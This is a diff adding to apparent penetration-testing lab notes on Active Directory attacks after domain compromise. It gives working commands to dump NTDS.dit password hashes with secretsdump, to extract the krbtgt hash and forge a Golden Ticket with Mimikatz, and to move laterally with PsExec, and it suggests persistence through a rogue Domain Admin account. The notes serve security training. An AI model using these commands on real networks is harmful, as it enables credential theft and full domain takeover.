@@ -188,3 +188,51 @@ mimikatz \# sekurlsa::logonPasswords
     - where does your account have access?
     - Old vulnerbilities die hard
 - Think outside the box
+
+# We've Compromised the Domain - Now What?
+## Post-Domain Compromise Attack Strategy
+
+- Provide as much value to the client as possible
+    - Put your blinders on and do it again
+    - Dump the NTDS.dit and crack passwords
+    - Enumerate shares for sensitive information
+- Persistence can be important
+    - What happens if our DA (Domain Admin) access is lost?
+    - Creating a DA account can be useful (DO NOT FORGET TO DELETE IT)
+    - Creating a Golden Ticket can be usefum, too
+
+## Dumping the NTDS.dit
+
+A database used to store AD data. This data includes:
+- User Information
+- Group Information
+- Security descriptors
+- And oh yeah, password hashes
+
+```bash
+# Dumping the NTDS.dit
+# We can simply use secretsdump against the DC to perform this attack
+secretsdump.py MARVEL.local/pparker:'Password2'@192.168.138.132 -just-dc-ntlm
+```
+
+## Golden Tickets Attack
+
+What is it?
+- When we compromise the krbtgt account, we own the domain
+- We can request access to any resource or system on the domain
+- Golden tickets == complete access to every machine
+
+```bash
+# we can use Mimikatz to obtain the information necessary to perform this attack
+C:\> mimikatz.exe
+mimikatz \# privilege::debug
+mimikatz \# lsadump::lsa /inject /name:krbtgt
+# Once we have the SID and krbtgt hash, we can generate a ticket
+mimikatz \# kerberos::golden /User:Administrator /domain:marvel.local /sid:... /krbtgt:... /id:500 /ptt
+# with a Golden ticket, we can now access other machines from the CMD
+mimikatz \# misc::cmd
+C:\> dir \\10.0.0.25\C$
+C:\>  PSExec64.exe \\10.0.0.25 cmd.exe 
+C:\> whoami # another user
+C:\> hostname
+```
